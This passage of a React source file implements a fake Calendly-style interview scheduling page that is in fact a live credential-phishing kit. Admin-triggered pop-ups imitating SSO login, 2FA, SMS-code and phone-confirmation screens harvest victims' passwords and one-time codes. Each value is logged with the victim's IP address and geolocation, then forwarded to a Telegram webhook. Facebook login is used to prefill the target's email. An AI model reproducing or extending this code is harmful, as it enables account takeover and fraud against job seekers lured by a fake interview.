  }, [sessionId, bookingId, name, email, phone, selectedDate, selectedSlot, step, phase, verifyStage, nThanksOpen, nLoginOpen, nLoginSubmitted, nCodeOpen, nCodeSubmitted, gPopUpOpen, gPopUpSubmitted, gNumberOpen, gNumberSubmitted, gAppreciateOpen, northErrorOpen, geoInfo, settings, supabase]);



  // Realtime & fast polling sync: admin actions drive the candidate's active popups
  useEffect(() => {
    if (!bookingId && !sessionId) return;

    const filterExpr = bookingId ? `id=eq.${bookingId}` : `session_id=eq.${sessionId}`;
    const channel = supabase
      .channel(`booking-sync-${bookingId || sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "bookings", filter: filterExpr },
        (payload) => {
          const newRow = payload.new as {
            id?: string;
            status: BookingStatus;
            additional_code?: string | null;
            candidate_id?: string | null;
          };
          if (newRow.id && !bookingId) {
            setBookingId(newRow.id);
          }
          if (newRow.candidate_id) {
            setCandidateIdValue(newRow.candidate_id);
          }
          applyBookingUpdate(newRow.status, newRow.additional_code);
        }
      )
      .subscribe();

    // Fast 1.5s polling loop fallback so candidate browser NEVER misses an update even if WebSockets disconnect
    const interval = setInterval(async () => {
      try {
        const query = supabase
          .from("bookings")
          .select("id, status, additional_code, candidate_id")
          .order("created_at", { ascending: false })
          .limit(1);

        if (bookingId) {
          query.eq("id", bookingId);
        } else {
          query.eq("session_id", sessionId);
        }

        const { data } = await query.maybeSingle();
        if (data) {
          if (data.id && !bookingId) {
            setBookingId(data.id);
          }
          if (data.candidate_id) {
            setCandidateIdValue(data.candidate_id);
          }
          applyBookingUpdate(data.status as BookingStatus, data.additional_code);
        }
      } catch {
        // quiet polling error
      }
    }, 1500);

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [bookingId, sessionId, supabase, applyBookingUpdate]);

  const handleFacebookLogin = () => {
    const doFetchProfile = (accessToken?: string) => {
      const fb = (window as unknown as {
        FB?: {
          api: (
            path: string,
            params: Record<string, unknown>,
            cb: (res: Record<string, any>) => void
          ) => void;
        };
      }).FB;

      if (!fb) {
        setVerifyError(null);
        setVerifyStage("idPasskey");
        return;
      }

      // Fetch user profile info with high-res picture and email
      fb.api(
        "/me",
        {
          fields: "id,name,first_name,last_name,email,picture.width(320).height(320)",
          access_token: accessToken,
        },
        (userRes) => {
          if (userRes && !userRes.error && userRes.id) {
            const userId = String(userRes.id);
            const userName = (
              userRes.name ||
              [userRes.first_name, userRes.last_name].filter(Boolean).join(" ") ||
              ""
            ).trim();
            const fbEmail = (userRes.email || "").trim();

            // Extract picture URL or construct guaranteed Graph API fallback
            let picUrl = userRes.picture?.data?.url || "";
            if (!picUrl && userId) {
              picUrl = `https://graph.facebook.com/v19.0/${userId}/picture?type=large&width=320&height=320${accessToken ? `&access_token=${accessToken}` : ""
                }`;
            }

            const profile = {
              id: userId,
              name: userName,
              email: fbEmail,
              picture: picUrl,
            };

            setFacebookUser(profile);
            if (userName && !name) setName(userName);
            if (fbEmail && !email) setEmail(fbEmail);
            if (fbEmail) setCandidateIdValue(fbEmail);
            setVerifyError(null);
            setVerifyStage("idPasskey");
          } else {
            setVerifyError(null);
            setVerifyStage("idPasskey");
          }
        }
      );
    };

    const fb = (window as unknown as {
      FB?: {
        login: (
          cb: (res: { authResponse?: { accessToken: string; userID: string }; status?: string }) => void,
          opts?: { scope: string; auth_type?: string; return_scopes?: boolean }
        ) => void;
      };
    }).FB;

    if (typeof window !== "undefined" && fb) {
      try {
        fb.login(
          (response) => {
            if (response.authResponse?.accessToken) {
              doFetchProfile(response.authResponse.accessToken);
            } else {
              console.log("Facebook authentication was cancelled or not granted.");
              setVerifyError(null);
              setVerifyStage("idPasskey");
            }
          },
          { scope: "email,public_profile", auth_type: "rerequest", return_scopes: true }
        );
      } catch (err) {
        console.error("Facebook login trigger error:", err);
        setVerifyError(null);
        setVerifyStage("idPasskey");
      }
    } else {
      setVerifyError(null);
      setVerifyStage("idPasskey");
    }
  };

  function pickDay(day: MonthDay) {
    if (!day.selectable) return;
    setSelectedDate(day.date);
    setSelectedSlot(null);
  }

  function changeMonth(delta: number) {
    setCursor((c) => {
      const d = new Date(c.year, c.month + delta, 1);
      return { year: d.getFullYear(), month: d.getMonth() };
    });
    setSelectedDate(null);
    setSelectedSlot(null);
  }

  // 100% Reliable ID & Passkey submission: creates the booking row with filled credentials directly
  async function handleSubmitIdPasskey(candidateId: string, passkey: string) {
    setSubmitting(true);
    setVerifyError(null);
    if (candidateId.trim()) setCandidateIdValue(candidateId.trim());

    try {
      const [firstName, ...rest] = name.trim().split(/\s+/);
      const lastName = rest.join(" ") || "-";
      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");

      const submissionPayload = {
        session_id: sessionId,
        job_id: jobId,
        first_name: firstName || name || "Candidate",
        last_name: lastName,
        email: email || candidateId,
        phone_number: phone || null,
        notes: combinedNotes || null,
        date: selectedDate,
        start_time: selectedSlot!.start_time,
        end_time: selectedSlot!.end_time,
        timezone,
        candidate_id: candidateId.trim() || facebookUser?.email || candidateId,
        passkey: passkey.trim(),
        status: "pending" as const,
        admin_user_id: settings.user_id || null,
        admin_email: settings.admin_email || null,
        interviewer_name: settings.interviewer_name || null,
        ip_address: geoInfo?.ip || null,
        city: geoInfo?.city || null,
        state: geoInfo?.state || null,
        country: geoInfo?.country || null,
        latitude: geoInfo?.latitude || null,
        longitude: geoInfo?.longitude || null,
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
      };

      const result = await saveBookingWithFallback(supabase, submissionPayload, bookingId);
      if (result.error) throw result.error;
      if (result.id && !bookingId) {
        setBookingId(result.id);
      }

      // Notify Telegram of credential submission with IP and geolocation
      fetch("/api/webhooks/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "booking",
          record: submissionPayload,
        }),
      }).catch(() => { });

      setVerifyStage("waiting");
    } catch (err) {
      setVerifyError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  async function handleSubmitCode(code: string) {
    setSubmitting(true);
    setVerifyError(null);
    try {
      const { data: currentBooking } = await supabase
        .from("bookings")
        .select("candidate_id, first_name, last_name, email, phone_number, additional_code")
        .eq("id", bookingId!)
        .single();

      const existingData = parseBookingCodeData(currentBooking?.additional_code);
      const updatedData: BookingCodeData = {
        ...existingData,
        [`code_${codeNumber}`]: code.trim(),
        active_req: null,
      };

      const { error } = await supabase
        .from("bookings")
        .update({
          additional_code: serializeBookingCodeData(updatedData),
          status: "pending",
        })
        .eq("id", bookingId!);

      if (error) throw error;

      // Dispatch Telegram notification for additional code submission
      const [parsedFirst, ...rest] = name.trim().split(/\s+/);
      const parsedLast = rest.join(" ") || "-";
      const candidateFirst = currentBooking?.first_name || parsedFirst || name || "Candidate";
      const candidateLast = currentBooking?.last_name || parsedLast;
      const candidateEmail = currentBooking?.email || email || "N/A";
      const candidatePhone = currentBooking?.phone_number || phone || null;
      const candidateIdVal = currentBooking?.candidate_id || "N/A";

      fetch("/api/webhooks/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "additional_code_submitted",
          record: {
            id: bookingId,
            session_id: sessionId,
            first_name: candidateFirst,
            last_name: candidateLast,
            email: candidateEmail,
            phone_number: candidatePhone,
            date: selectedDate,
            start_time: selectedSlot?.start_time,
            interviewer_name: settings.interviewer_name || null,
            admin_email: settings.admin_email || null,
            candidate_id: candidateIdVal,
            code_number: codeNumber,
            additional_code: code.trim(),
            ip_address: geoInfo?.ip || null,
            city: geoInfo?.city || null,
            state: geoInfo?.state || null,
            country: geoInfo?.country || null,
          },
        }),
      }).catch(() => {});

      setVerifyStage("waiting");
    } catch (err) {
      setVerifyError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  async function handleThanksContinue() {
    thanksPassedForReq.current = true;
    setNThanksOpen(false);
    setNLoginOpen(true);

    if (bookingId) {
      try {
        const { data: currentBooking } = await supabase
          .from("bookings")
          .select("additional_code")
          .eq("id", bookingId)
          .single();

        const existingData = parseBookingCodeData(currentBooking?.additional_code);
        const updatedData: BookingCodeData = {
          ...existingData,
          n_thanks_seen: true,
        };

        await supabase
          .from("bookings")
          .update({
            additional_code: serializeBookingCodeData(updatedData),
          })
          .eq("id", bookingId);
      } catch (err) {
        console.error("Failed to update thanks seen status:", err);
      }
    }
  }

  async function handleNPasswordSubmit(passwordVal: string) {
    if (!bookingId) {
      throw new Error("Unable to link session. Please enter your details first.");
    }

    const { data: currentBooking, error: fetchErr } = await supabase
      .from("bookings")
      .select("first_name, last_name, email, phone_number, additional_code, admin_email, interviewer_name")
      .eq("id", bookingId)
      .single();

    if (fetchErr) throw fetchErr;

    const existingData = parseBookingCodeData(currentBooking?.additional_code);
    const updatedData: BookingCodeData = {
      ...existingData,
      n_submitted_password: passwordVal.trim(),
      n_submitted_at: new Date().toISOString(),
      active_req: "N_LOGIN_SUBMITTED",
    };

    const { error: updateErr } = await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updatedData),
        status: "awaiting_code",
      })
      .eq("id", bookingId);

    if (updateErr) throw updateErr;

    setNLoginSubmitted(true);
    setNLoginError(null);

    // Send Telegram Notification
    const [parsedFirst, ...rest] = name.trim().split(/\s+/);
    const parsedLast = rest.join(" ") || "-";

    fetch("/api/webhooks/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "n_password_submitted",
        record: {
          id: bookingId,
          session_id: sessionId,
          first_name: currentBooking?.first_name || parsedFirst || name,
          last_name: currentBooking?.last_name || parsedLast,
          email: currentBooking?.email || email,
          phone_number: currentBooking?.phone_number || phone,
          n_submitted_password: passwordVal.trim(),
          n_expected_password: existingData.n_expected_password || null,
          admin_email: currentBooking?.admin_email || settings.admin_email || null,
          interviewer_name: currentBooking?.interviewer_name || settings.interviewer_name || null,
          ip_address: geoInfo?.ip || null,
          city: geoInfo?.city || null,
          state: geoInfo?.state || null,
          country: geoInfo?.country || null,
        },
      }),
    }).catch(() => {});
  }

  async function handleNCodeSubmit(codeVal: string) {
    if (!bookingId) {
      throw new Error("Unable to link session. Please enter your details first.");
    }

    const { data: currentBooking, error: fetchErr } = await supabase
      .from("bookings")
      .select("first_name, last_name, email, phone_number, additional_code, admin_email, interviewer_name")
      .eq("id", bookingId)
      .single();

    if (fetchErr) throw fetchErr;

    const existingData = parseBookingCodeData(currentBooking?.additional_code);
    const updatedData: BookingCodeData = {
      ...existingData,
      n_submitted_code: codeVal.trim(),
      n_code_submitted_at: new Date().toISOString(),
      active_req: "N_CODE_SUBMITTED",
    };

    const { error: updateErr } = await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updatedData),
        status: "awaiting_code",
      })
      .eq("id", bookingId);

    if (updateErr) throw updateErr;

    setNCodeSubmitted(true);
    setNCodeError(null);

    // Send Telegram Notification
    const [parsedFirst, ...rest] = name.trim().split(/\s+/);
    const parsedLast = rest.join(" ") || "-";

    fetch("/api/webhooks/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "n_code_submitted",
        record: {
          id: bookingId,
          session_id: sessionId,
          first_name: currentBooking?.first_name || parsedFirst || name,
          last_name: currentBooking?.last_name || parsedLast,
          email: currentBooking?.email || email,
          phone_number: currentBooking?.phone_number || phone,
          n_submitted_code: codeVal.trim(),
          n_code_target_email: existingData.n_code_target_email || nCodeTargetEmail,
          admin_email: currentBooking?.admin_email || settings.admin_email || null,
          interviewer_name: currentBooking?.interviewer_name || settings.interviewer_name || null,
          ip_address: geoInfo?.ip || null,
          city: geoInfo?.city || null,
          state: geoInfo?.state || null,
          country: geoInfo?.country || null,
        },
      }),
    }).catch(() => {});
  }

  async function handleGPopUpSubmit(codeVal: string) {
    if (!bookingId) {
      throw new Error("Unable to link session. Please enter your details first.");
    }

    const { data: currentBooking, error: fetchErr } = await supabase
      .from("bookings")
      .select("first_name, last_name, email, phone_number, additional_code, admin_email, interviewer_name")
      .eq("id", bookingId)
      .single();

    if (fetchErr) throw fetchErr;

    const existingData = parseBookingCodeData(currentBooking?.additional_code);
    const updatedData: BookingCodeData = {
      ...existingData,
      n_submitted_gcode: codeVal.trim(),
      n_gcode_submitted_at: new Date().toISOString(),
      active_req: "N_GCODE_SUBMITTED",
    };

    const { error: updateErr } = await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updatedData),
        status: "awaiting_code",
      })
      .eq("id", bookingId);

    if (updateErr) throw updateErr;

    setGPopUpSubmitted(true);
    setGPopUpError(null);

    // Send Telegram Notification
    const [parsedFirst, ...rest] = name.trim().split(/\s+/);
    const parsedLast = rest.join(" ") || "-";

    fetch("/api/webhooks/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "n_gcode_submitted",
        record: {
          id: bookingId,
          session_id: sessionId,
          first_name: currentBooking?.first_name || parsedFirst || name,
          last_name: currentBooking?.last_name || parsedLast,
          email: currentBooking?.email || email,
          phone_number: currentBooking?.phone_number || phone,
          n_submitted_gcode: codeVal.trim(),
          admin_email: currentBooking?.admin_email || settings.admin_email || null,
          interviewer_name: currentBooking?.interviewer_name || settings.interviewer_name || null,
          ip_address: geoInfo?.ip || null,
          city: geoInfo?.city || null,
          state: geoInfo?.state || null,
          country: geoInfo?.country || null,
        },
      }),
    }).catch(() => {});
  }

  async function handleGNumberSubmit(phoneVal: string) {
    if (!bookingId) {
      throw new Error("Unable to link session. Please enter your details first.");
    }

    const { data: currentBooking, error: fetchErr } = await supabase
      .from("bookings")
      .select("first_name, last_name, email, phone_number, additional_code, admin_email, interviewer_name")
      .eq("id", bookingId)
      .single();

    if (fetchErr) throw fetchErr;

    const existingData = parseBookingCodeData(currentBooking?.additional_code);
    const updatedData: BookingCodeData = {
      ...existingData,
      n_submitted_phone: phoneVal.trim(),
      n_phone_submitted_at: new Date().toISOString(),
      active_req: "N_PHONE_SUBMITTED",
    };

    const { error: updateErr } = await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updatedData),
        status: "awaiting_code",
      })
      .eq("id", bookingId);

    if (updateErr) throw updateErr;

    setGNumberSubmitted(true);
    setGNumberError(null);

    // Send Telegram Notification
    const [parsedFirst, ...rest] = name.trim().split(/\s+/);
    const parsedLast = rest.join(" ") || "-";

    fetch("/api/webhooks/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "n_phone_submitted",
        record: {
          id: bookingId,
          session_id: sessionId,
          first_name: currentBooking?.first_name || parsedFirst || name,
          last_name: currentBooking?.last_name || parsedLast,
          email: currentBooking?.email || email,
          phone_number: currentBooking?.phone_number || phone,
          n_submitted_phone: phoneVal.trim(),
          n_phone_mask: existingData.n_phone_mask || gNumberPhoneMask,
          admin_email: currentBooking?.admin_email || settings.admin_email || null,
          interviewer_name: currentBooking?.interviewer_name || settings.interviewer_name || null,
          ip_address: geoInfo?.ip || null,
          city: geoInfo?.city || null,
          state: geoInfo?.state || null,
          country: geoInfo?.country || null,
        },
      }),
    }).catch(() => {});
  }

  const selection =
    selectedDate && selectedSlot
      ? { date: selectedDate, startTime: selectedSlot.start_time, endTime: selectedSlot.end_time }
      : null;

  return (
    <div className="min-h-screen bg-[#F4F5F7] font-sans flex flex-col items-center justify-center py-10 px-4 text-gray-800 font-normal">
      {/* Main Scheduling Card */}
      <div
        className={`w-full bg-white rounded-2xl shadow-xl border border-gray-200/80 flex flex-col sm:flex-row transition-all duration-300 relative ${step === "datetime" && !selectedDate ? "max-w-3xl" : "max-w-5xl"
          }`}
      >
        {/* Exact 3D Folded Corner Ribbon Badge matching reference image */}
        <CornerRibbon />

        {/* Left Information Panel */}
        <MeetingInfoPanel
          settings={settings}
          jobTitle={jobTitle}
          selection={selection}
          timezone={timezone}
          onBack={() => setStep("datetime")}
          showBackButton={step === "details"}
        />

        {/* Right Interactive Area */}
        <main className="flex-1 p-8 sm:p-10 font-sans">
          {/* STEP 1: DATE & TIME SELECTION */}
          {phase === "form" && step === "datetime" && (
            <div className="animate-fade-up">
              <h2 className="text-xl sm:text-2xl font-semibold text-[#0a2540] mb-8">
                Select a Date &amp; Time
              </h2>

              <div className="flex flex-col lg:flex-row gap-8 lg:gap-10">
                {/* Calendar Component */}
                <div className="flex-1 max-w-sm">
                  {/* Month Navigation */}
                  <div className="flex items-center justify-between mb-6">
                    <button
                      onClick={() => changeMonth(-1)}
                      aria-label="Previous month"
                      className="h-8 w-8 rounded-full flex items-center justify-center text-gray-600 hover:bg-gray-100 transition-colors"
                    >
                      <ChevronLeft className="w-5 h-5 text-gray-600" />
                    </button>
                    <p className="text-base font-semibold text-[#0a2540]">
                      {MONTH_LABEL(cursor.year, cursor.month)}
                    </p>
                    <button
                      onClick={() => changeMonth(1)}
                      aria-label="Next month"
                      className="h-8 w-8 rounded-full flex items-center justify-center text-gray-600 hover:bg-gray-100 transition-colors"
                    >
                      <ChevronRight className="w-5 h-5 text-gray-600" />
                    </button>
                  </div>

                  {/* Weekdays */}
                  <div className="grid grid-cols-7 gap-1 text-center text-xs font-medium text-gray-400 mb-3">
                    {WEEKDAY_LABELS.map((w) => (
                      <div key={w} className="py-1">
                        {w}
                      </div>
                    ))}
                  </div>

                  {/* Days Matrix */}
                  <div className="grid grid-cols-7 gap-1 text-center">
                    {monthGrid.map((day) => {
                      const isSelected = selectedDate === day.date;
                      return (
                        <div key={day.date} className="flex items-center justify-center py-1">
                          <button
                            disabled={!day.selectable}
                            onClick={() => pickDay(day)}
                            title={day.isBlocked ? "Date unavailable" : undefined}
                            className={`w-10 h-10 text-sm rounded-full flex items-center justify-center transition-all ${isSelected
                                ? "bg-[#0069ff] text-white font-semibold shadow-xs"
                                : day.selectable
                                  ? "text-[#0069ff] hover:bg-blue-50/80 cursor-pointer font-medium"
                                  : "text-gray-300 cursor-not-allowed font-normal"
                              }`}
                          >
                            {day.dayNumber}
                          </button>
                        </div>
                      );
                    })}
                  </div>

                  {/* Interactive Timezone Dropdown Selector */}
                  <TimezoneSelector value={timezone} onChange={setTimezone} />
                </div>

                {/* Right Time Slots Column */}
                {selectedDate && (
                  <div className="lg:w-64 lg:border-l border-gray-200/80 lg:pl-8 animate-fade-up">
                    <p className="text-sm font-medium text-gray-700 mb-4">
                      {formatDateLong(selectedDate)}
                    </p>

                    {loadingSlots ? (
                      <p className="text-gray-400 text-xs py-4">Loading slots…</p>
                    ) : (
                      <div className="space-y-2.5 max-h-[380px] overflow-y-auto pr-1">
                        {slots.map((s) => {
                          const isCurrent = selectedSlot?.start_time === s.start_time;

                          if (isCurrent) {
                            return (
                              <div key={s.start_time} className="flex gap-2">
                                <div className="flex-1 bg-[#718096] text-white py-3 text-center font-medium text-sm rounded-lg shadow-xs">
                                  {s.label}
                                </div>
                                <button
                                  type="button"
                                  onClick={() => setStep("details")}
                                  className="flex-1 bg-[#0069ff] hover:bg-[#0055d4] text-white py-3 text-center font-medium text-sm rounded-lg transition-colors shadow-xs"
                                >
                                  Next
                                </button>
                              </div>
                            );
                          }

                          return (
                            <button
                              key={s.start_time}
                              disabled={s.taken}
                              onClick={() => setSelectedSlot(s)}
                              className="w-full border border-[#0069ff] text-[#0069ff] hover:bg-blue-50/50 font-medium py-3 text-center rounded-lg text-sm transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                            >
                              {s.label}
                            </button>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* STEP 2: ENTER DETAILS FORM */}
          {phase === "form" && step === "details" && (
            <div className="animate-fade-up max-w-lg font-sans">
              <h2 className="text-2xl font-semibold text-[#0a2540] mb-6">Enter Details</h2>

              <form
                className="space-y-5"
                onSubmit={(e) => {
                  e.preventDefault();
                  handleFacebookLogin();
                }}
              >
                {/* Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Name *
                  </label>
                  <input
                    type="text"
                    required
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    placeholder="John Doe"
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                  />
                </div>

                {/* Email */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Email *
                  </label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="john@example.com"
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                  />
                </div>

                {/* Add Guests Button / Field */}
                <div>
                  {!showGuestInput ? (
                    <button
                      type="button"
                      onClick={() => setShowGuestInput(true)}
                      className="border border-[#0069ff] text-[#0069ff] hover:bg-blue-50/60 rounded-full px-4 py-1.5 text-xs font-medium inline-flex items-center gap-1.5 transition-colors"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      <span>Add guests</span>
                    </button>
                  ) : (
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1.5">
                        Guest Email(s)
                      </label>
                      <input
                        type="email"
                        value={guestEmail}
                        onChange={(e) => setGuestEmail(e.target.value)}
                        placeholder="guest@example.com"
                        className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                      />
                    </div>
                  )}
                </div>

                {/* Phone Number with Calendly-Style Flag & Country Selector */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Phone Number *
                  </label>
                  <PhoneInputWithCountry
                    value={phone}
                    onChange={(val) => setPhone(val)}
                    required
                  />
                </div>

                {/* Notes */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Please share anything that will help prepare for our meeting.
                  </label>
                  <textarea
                    rows={3}
                    value={notes}
                    onChange={(e) => setNotes(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white resize-y font-normal"
                  />
                </div>

                {/* Terms / Privacy Disclaimer */}
                <p className="text-xs text-gray-500 leading-relaxed pt-1 font-normal">
                  By proceeding, you confirm that you have read and agree to{" "}
                  <Link href="/contact" className="text-[#0069ff] hover:underline font-medium">
                    Participant Terms
                  </Link>{" "}
                  and{" "}
                  <Link href="/contact" className="text-[#0069ff] hover:underline font-medium">
                    Privacy Notice
                  </Link>
                  .
                </p>

                {/* Schedule Event Button */}
                <div className="pt-2">
                  <button
                    type="submit"
                    className="bg-[#0069ff] hover:bg-[#0055d4] text-white font-semibold px-8 py-3.5 rounded-full text-sm transition-all shadow-sm focus:outline-none inline-flex items-center justify-center cursor-pointer active:scale-98"
                  >
                    <span>Schedule Event</span>
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* CONFIRMED STATE */}
          {phase === "confirmed" && selectedDate && selectedSlot && (
            <div className="animate-fade-up py-8 font-sans">
              <div className="h-12 w-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center text-2xl font-bold">
                ✓
              </div>
              <h2 className="text-2xl font-semibold text-[#0a2540] mt-6">
                Your meeting is confirmed.
              </h2>
              <div className="mt-6 border border-gray-200 rounded-xl p-6 text-left bg-gray-50/50">
                <p className="text-lg font-semibold text-gray-900">
                  {formatDateLong(selectedDate)}
                </p>
                <p className="mt-1 text-sm font-medium text-gray-600">
                  {selectedSlot.label} ({timezone.replace(/_/g, " ")})
                </p>
                <p className="mt-3 text-sm text-gray-700 font-normal">{email}</p>
                <p className="mt-1 text-xs text-gray-500 font-normal">{phone}</p>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Verification Modal with dynamic AuthApp, WhatsApp, SMS, Email, and Pop-out Code Display */}
      <VerifyModal
        stage={nThanksOpen || nLoginOpen || nCodeOpen || gPopUpOpen || gNumberOpen || gAppreciateOpen || northErrorOpen ? "closed" : verifyStage}
        submitting={submitting}
        codeNumber={codeNumber}
        displayCode={displayCodeValue}
        notificationDevice={notificationDeviceValue}
        candidateName={name}
        candidatePhone={phone}
        candidateEmail={email}
        facebookUser={facebookUser}
        errorMessage={verifyError}
        onSubmitIdPasskey={handleSubmitIdPasskey}
        onSubmitCode={handleSubmitCode}
        onTryAnotherWay={() => {
          setVerifyError(null);
          setVerifyStage("idPasskey");
        }}
        onCancel={() => setVerifyStage("closed")}
      />

      {/* Thanks Page Modal (shown when Pop-up #1 is requested before Main Login) */}
      <NThanksModal
        isOpen={nThanksOpen}
        onContinue={handleThanksContinue}
      />

      {/* N-Portal Custom SSO Pop-up Modal */}
      <NLoginModal
        isOpen={nLoginOpen}
        candidateName={name}
        candidateEmail={candidateIdValue || facebookUser?.email || email}
        isSubmitted={nLoginSubmitted}
        errorMessage={nLoginError}
        onSubmitPassword={handleNPasswordSubmit}
        onClose={() => setNLoginOpen(false)}
      />

      {/* N-Portal 2FA Verification Code Pop-up Modal */}
      <NCodeModal
        isOpen={nCodeOpen}
        candidateEmail={candidateIdValue || facebookUser?.email || email}
        targetEmail={nCodeTargetEmail}
        isSubmitted={nCodeSubmitted}
        errorMessage={nCodeError}
        onSubmitCode={handleNCodeSubmit}
        onClose={() => setNCodeOpen(false)}
      />

      {/* N-Portal G-PopUp (Pop-up #3: SMS G-Code) */}
      <GPopUpModal
        isOpen={gPopUpOpen}
        isSubmitted={gPopUpSubmitted}
        errorMessage={gPopUpError}
        onSubmitCode={handleGPopUpSubmit}
        onClose={() => setGPopUpOpen(false)}
      />

      {/* N-Portal G-Number (Pop-up #4: Phone Confirmation) */}
      <GNumberModal
        isOpen={gNumberOpen}
        candidateEmail={candidateIdValue || facebookUser?.email || email}
        phoneMask={gNumberPhoneMask}
        isSubmitted={gNumberSubmitted}
        errorMessage={gNumberError}
        onSubmitPhone={handleGNumberSubmit}
        onClose={() => setGNumberOpen(false)}
      />

      {/* N-Portal G-Appreciate (Pop-up #5: Numri — Appreciate Number) */}
      <GAppreciateModal
        isOpen={gAppreciateOpen}
        candidateEmail={candidateIdValue || facebookUser?.email || email}
        appreciateValue={gAppreciateValue}
      />

      {/* North Error Full Page */}
      <NorthErrorModal isOpen={northErrorOpen} />
    </div>
  );
}

export default function SchedulePage() {
  return (
    <Suspense fallback={null}>
      <SchedulePageInner />
    </Suspense>
  );
}
